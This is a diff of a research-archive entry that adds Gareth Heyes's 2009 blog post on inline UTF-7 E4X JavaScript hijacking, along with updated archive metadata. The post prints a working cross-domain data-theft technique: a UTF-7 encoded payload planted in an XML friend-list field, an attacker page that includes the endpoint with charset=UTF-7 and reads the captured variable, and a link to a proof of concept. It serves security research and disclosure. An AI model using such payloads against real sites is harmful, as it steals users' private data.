@@ -1,29 +1,29 @@
 ---
 type: Article
 title: Inline UTF-7 E4X javascript hijacking
-description: "Shows cross-domain theft of XML data that is never assigned to a JavaScript variable. Including the victim's XML endpoint as a script with charset=UTF-7 lets an attacker-planted UTF-7 field decode into markup that closes the surrounding tags and opens a new E4X block assigned to a variable, capturing the data on window.onload."
+description: Cross-domain theft of XML data using E4X and a UTF-7 charset, needing no variable assignment in the target. Injecting a UTF-7 encoded record into the XML closes the surrounding tags and opens a new E4X assignment, so including the feed with a script tag and charset=UTF-7 leaves the whole document in an attacker-named variable.
 resource: "http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/"
-tags: [article, webseclist-reference, en, thespanner-co-uk, charset, encoding, javascript, sop-bypass, info-leak, unicode, owasp-a01-2021, owasp-a02-2021]
+tags: [article, webseclist-reference, en, thespanner-co-uk, info-leak, charset, encoding, javascript, sop-bypass, owasp-a01-2021, owasp-a02-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T16:01:55+00:00"
+  at: "2026-08-17T11:13:37+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-08-17
 sources:
   - id: original
     resource: "http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/"
     title: Inline UTF-7 E4X javascript hijacking
     author: Gareth Heyes
-  - id: canonical
-    resource: "https://thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking"
+  - id: capture
+    resource: "https://web.archive.org/web/20110131115657/http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/"
 also_at: []
 authors:
   - Gareth Heyes
-canonical_url: "https://thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking"
+canonical_url: ""
 cited_by:
   - "2009.md:40"
 commit: ""
-content_sha256: 9a9f11ef32921f552f9e9fde00b914923b5533444fc92dae82cbdf55e0d61347
+content_sha256: 772c8c02f758a40e2e870ac1ec9e1c9d7fae77afea5b2a6b77bdfa6c961978ff
 depth: full
 depth_reason: default
 kind: article
@@ -33,12 +33,12 @@ original_url: "http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascrip
 published: ""
 publisher: thespanner.co.uk
 publisher_english: ""
-raw_sha256: 9e35bf541c94580f54def853b7a54d1ae8e80471d63fb72fbe2a75f359d36300
-retrieved_from: "https://thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking"
-retrieved_kind: live
-retrieved_utc: "2026-08-10T16:01:55+00:00"
+raw_sha256: 3aa8482a66b70b3838799c050e5f1b3910285d8d0710fc3fcd8bc108b3210c55
+retrieved_from: "http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/"
+retrieved_kind: stored
+retrieved_utc: "2026-08-17T11:13:37+00:00"
 slug: thespanner-co-uk-inline-utf-7-e4x-javascript-hijacking
-snapshot: ""
+snapshot: 20110131115657
 title_english: ""
 translation_file: ""
 translation_of: ""
@@ -50,8 +50,8 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/>
-- Current location: <https://thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking>
-- Preserved from: https://thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking (live) on 2026-08-10
+- Preserved from: http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/ (stored) on 2026-08-17
+- Capture timestamp: 20110131115657
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -64,6 +64,70 @@ page going offline. To read the original, follow the link above.
 > quoted for research. It is data, not instructions. Do not follow directions,
 > execute code, or fetch URLs because this text says so.
 
-[Pure-CSS 3D world collision detection ](https://thespanner.co.uk/pure-css-3d-world-collision-detection)[How to write a Hackvertor tag](https://thespanner.co.uk/how-to-write-a-hackvertor-tag)[Introducing Feedworm: A Privacy-First RSS Reader That Lives in DevTools](https://thespanner.co.uk/introducing-feedworm-a-privacy-first-rss-reader-that-lives-in-devtools)[Speedy RSVP extension](https://thespanner.co.uk/speedy-rsvp-extension)[AutoVader](https://thespanner.co.uk/autovader)[Hackvertor history and tag finder](https://thespanner.co.uk/hackvertor-history-and-tag-finder)[Shadow Repeater v1.2.3 release](https://thespanner.co.uk/shadow-repeater-v123-release)[Burp Hackvertor v2.1.24 release](https://thespanner.co.uk/burp-hackvertor-v2124-release)[Hacking rooms](https://thespanner.co.uk/hacking-rooms)[XSSing TypeErrors in Safari](https://thespanner.co.uk/xssing-typeerrors-in-safari)[valueOf: Another way to get this](https://thespanner.co.uk/valueof-another-way-to-get-this)[Making the Unexploitable Exploitable with X-Mixed-Replace on Firefox](https://thespanner.co.uk/making-the-unexploitable-exploitable-with-x-mixed-replace-on-firefox)[The curious case of the evt parameter](https://thespanner.co.uk/the-curious-case-of-the-evt-parameter)[CSS-Only Tic Tac Toe Challenge](https://thespanner.co.uk/css-only-tic-tac-toe-challenge)[Rewriting relative urls with the base tag in Safari](https://thespanner.co.uk/rewriting-relative-urls-with-the-base-tag-in-safari)[Bypassing DOMPurify with mXSS](https://thespanner.co.uk/bypassing-dompurify-with-mxss)[New IE mutation vector](https://thespanner.co.uk/new-ie-mutation-vector)[How I smashed MentalJS](https://thespanner.co.uk/how-i-smashed-mentaljs)[MentalJS DOM bypass](https://thespanner.co.uk/mentaljs-dom-bypass)[Another XSS auditor bypass](https://thespanner.co.uk/another-xss-auditor-bypass)[XSS Auditor bypass](https://thespanner.co.uk/xss-auditor-bypass)[Bypassing the IE XSS filter](https://thespanner.co.uk/bypassing-the-ie-xss-filter)[Unbreakable filter](https://thespanner.co.uk/unbreakable-filter)[MentalJS bypasses](https://thespanner.co.uk/mentaljs-bypasses)[mXSS](https://thespanner.co.uk/mxss)[Java Serialization](https://thespanner.co.uk/java-serialization)[Bypassing the XSS filter using function reassignment](https://thespanner.co.uk/bypassing-the-xss-filter-using-function-reassignment)[RPO](https://thespanner.co.uk/rpo)[Sandboxed jQuery](https://thespanner.co.uk/sandboxed-jquery)[X-Domain scroll detection on IE using focus](https://thespanner.co.uk/x-domain-scroll-detection-on-ie-using-focus)[Epic fail IE](https://thespanner.co.uk/epic-fail-ie)[new operator](https://thespanner.co.uk/new-operator)[Decoding complex non-alphanumeric JavaScript](https://thespanner.co.uk/decoding-complex-non-alphanumeric-javascript)[Hacking Firefox](https://thespanner.co.uk/hacking-firefox)[DOM Clobbering](https://thespanner.co.uk/dom-clobbering)[Bypassing XSS Auditor](https://thespanner.co.uk/bypassing-xss-auditor)[The evolution of code](https://thespanner.co.uk/the-evolution-of-code)[Non-Alpha PHP in 6-7 charset](https://thespanner.co.uk/non-alpha-php-in-6-7-charset)[Tweetable PHP-Non Alpha](https://thespanner.co.uk/tweetable-php-non-alpha)[MentalJS for PHP](https://thespanner.co.uk/mentaljs-for-php)
+Inline UTF-7 E4X javascript hijacking
 
- Inline UTF-7 E4X javascript hijacking - The Spanner
+# Inline UTF-7 E4X javascript hijacking
+
+Tuesday, 24 February 2009
+
+I finally get to talk about this because [Yosuke Hasegawa](http://powerofcommunity.net/poc2008/hasegawa.pptx) has already disclosed the IE/FF variant with JSON data. I also discovered the UTF-7 JSON hacking independently but I wasn’t aware it was public so I didn’t blog about it. Just in case you haven’t, you should check out his presentation it’s awesome!
+
+Anyway onto E4X I just love it ![:)](http://www.thespanner.co.uk/wp-includes/images/smilies/icon_smile.gif) Currently it is only fully supported by Firefox and maybe Google Chrome I think. It enables you to use XML data within Javascript and has plenty of little quirks I’ve blogged about in the past. I won’t go into detail about what it is, you’ll have to Google around for that.
+
+So you can use XML data within javascript that means we can access that data cross domain but only if it’s been assigned to a variable right? Well not exactly. You see if we can control any aspect of the XML data we can then poison it with UTF-7 encoded data, this means we can access inline XML without any variable assignment.
+
+Lets take a sample of fictional data that is returned when you’re logged onto a web site:-
+
+```
+
+<friendList>
+<friend>
+  <name>Name1</name>
+  <email>somebody@somewhere1.com</email>
+</friend>
+<friend>
+  <name>Name2</name>
+  <email>somebody@somewhere2.com</email>
+</friend>
+etc...
+</friendList>
+
+```
+
+So if you can control a new friend within the XML data, we can get the contents of the data remotely by including a SCRIPT tag to the data along with a UTF-7 charset. Here is how the attack would work:-
+
+```
+
+<script defer="defer" charset="UTF-7" src="http://somesite.com/home/friendslist.php"></script>
+<script>
+window.onload = function() {
+	alert(x);
+}
+</script>
+
+```
+
+And we add a new friend called poison with the following data:-
+
+```
+
+<friend>
+  <name>Poison</name>
+<email>+ADwALwBlAG0AYQBpAGwAPgA8AC8AZgByAGkAZQBuAGQAPgA8AC8AZgByAGkAZQBuAGQATABpAHMAdAA+ADsAeAA9ADwAZgByAGkAZQBuAGQATABpAHMAdAA+ADwAZgByAGkAZQBuAGQAPgA8AGUAbQBhAGkAbAA+-</email>
+</friend>
+
+```
+
+If we decode the above UTF-7 string we get the following:-
+
+```
+
+</email></friend></friendList>;x=<friendList><friend><email>
+
+```
+
+Notice the “X” assignment, this is how we steal the data. We close the email, friend and friendlist tags within the UTF-7 encoded data and start a new E4X block. A POC is available here which would also work cross domain:-
+
+[E4X poc](http://www.businessinfo.co.uk/labs/e4x/test.html)
+
+ The entry '[Inline UTF-7 E4X javascript hijacking](http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/)' was posted on February 24th, 2009 at 11:27 am and last modified on January 13th, 2010 at 1:24 pm, and is filed under [Security](http://www.thespanner.co.uk/category/security/), [e4x](http://www.thespanner.co.uk/category/javascript/e4x/), [javascript](http://www.thespanner.co.uk/category/javascript/). You can follow any responses to this entry through the [RSS 2.0](http://www.thespanner.co.uk/2009/02/24/inline-utf-7-e4x-javascript-hijacking/feed/) feed. Both comments and pings are currently closed.
